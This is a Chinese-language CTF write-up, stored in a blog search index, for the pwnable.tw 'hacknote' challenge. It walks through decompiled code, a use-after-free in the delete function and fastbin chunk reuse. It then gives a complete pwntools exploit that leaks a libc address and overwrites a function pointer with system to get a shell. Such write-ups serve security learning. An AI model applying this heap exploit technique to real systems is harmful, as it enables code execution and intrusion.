<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackNote</title>
      <link href="/posts/HackNote.html"/>
      <url>/posts/HackNote.html</url>
      
        <content type="html"><![CDATA[<h2 id="Hacknote"><a href="#Hacknote" class="headerlink" title="Hacknote"></a>Hacknote</h2><p>对于入门堆的师傅来说，这是个不错的入门题，但pwnabletw上扣了符号表，gdb调试起来比较麻烦，建议先做攻防世界上的，我们先看看ida反编译出来的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl __noreturn main()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v2; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      all_choice();</span><br><span class="line">      read(0, buf, 4u);</span><br><span class="line">      v0 = atoi(buf);                           // get choice</span><br><span class="line">      if ( v0 != 2 )</span><br><span class="line">        break;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v0 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v0 == 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v0 == 4 )</span><br><span class="line">          exit(0);</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v0 != 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较经典的形式，这里的重点在三个函数上，我们一起看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebx</span><br><span class="line">  int i; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; // [esp+10h] [ebp-18h]</span><br><span class="line">  char buf[8]; // [esp+14h] [ebp-14h] BYREF</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  if ( limit &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !*(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;ptr + i) = malloc(8u);</span><br><span class="line">        if ( !*(&amp;ptr + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;ptr + i) = puts_a;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, buf, 8u);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (int)*(&amp;ptr + i);</span><br><span class="line">        *(_DWORD *)(v0 + 4) = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)*(&amp;ptr + i) + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)*(&amp;ptr + i) + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++limit;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####delete</span><br><span class="line">unsigned int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4u);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= limit )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;ptr + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)*(&amp;ptr + v1) + 1));</span><br><span class="line">    free(*(&amp;ptr + v1));</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####print_note</span><br><span class="line">unsigned int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4u);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= limit )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;ptr + v1) )</span><br><span class="line">    (*(void (__cdecl **)(_DWORD))*(&amp;ptr + v1))(*(&amp;ptr + v1));</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细看可以发现，delete节点后这里没有把指针置为NULL,也没有对note数量进行减操作，delete后的note仍然可以通过print_note来访问，很明显是存在uaf(Use-after-free)漏洞的。<br>我们继续看add的逻辑，发现这个程序在生成一个content节点之前，会先申请一个chunk存放puts的地址和content chunk的地址。那现在，我们已经有大概的思路了，首先由于index chunk的申请大小小于0x10，所以在free之后它会归fastbin管理，fastbin是个单向链表，遵循先进后出原则（最后一个free的chunk会被优先分配）。那么我们就可以先申请两个大于0x20的note,记为note0,note1。index chunk 记为index0,index1。再将他们delete,由于note大于0x20,所以此时我们的fastbin是:index0-&gt;index1,此时我们再去申请一个小于0xf的chunk(add_note),那么这个note的chunk就会从fastbin中取，这个note我们记为<strong>note3: index : index0, content:index1</strong> 此时我们就可以向index1里面写一些函数的地址 ，然后调用了。 知道原理后 ，这就是一个简单的32位ret2libc。<br/><br>###exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">#p=process(&quot;./hacknote&quot;)</span><br><span class="line">p=remote(&quot;chall.pwnable.tw&quot;,10102)</span><br><span class="line">elf=ELF(&quot;./hacknote&quot;)</span><br><span class="line">def add_note(size,content):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(1))</span><br><span class="line">    p.sendafter(&quot;size :&quot;,str(size))</span><br><span class="line">    p.sendafter(&quot;Content :&quot;,content)</span><br><span class="line">def delete_note(index):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(2))</span><br><span class="line">    p.sendafter(&quot;Index :&quot;,str(index))</span><br><span class="line">def print_note(index):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(3))</span><br><span class="line">    p.sendafter(&quot;Index :&quot;,str(index))</span><br><span class="line">def get_out():</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(4))</span><br><span class="line">libc=ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add_note(size=0x50,content=b&quot;aaaa&quot;) #note 0</span><br><span class="line">add_note(size=0x50,content=b&quot;aaaa&quot;)# note 1</span><br><span class="line">delete_note(1) #delete note 1</span><br><span class="line">delete_note(0) #delete note 0</span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">puts=0x804862B</span><br><span class="line">payload=p32(puts)+p32(read_got)</span><br><span class="line">add_note(size=0x8,content=payload)</span><br><span class="line">print_note(1)</span><br><span class="line">read_addr=int.from_bytes(p.recv(4),byteorder=&quot;little&quot;)</span><br><span class="line">libc_base=read_addr-libc.sym[&quot;read&quot;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system=libc.sym[&quot;system&quot;]+libc_base</span><br><span class="line">bin_sh=libc_base+next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line">payload=p32(system)+b&quot;;sh\0&quot;</span><br><span class="line">#add_note(size=0x20,content=b&quot;aaaa&quot;)</span><br><span class="line">delete_note(2)</span><br><span class="line">#delete_note(3)</span><br><span class="line">add_note(size=0x8,content=payload)</span><br><span class="line">print_note(1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>如有错误，欢迎各位师傅指正。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
  
</search>
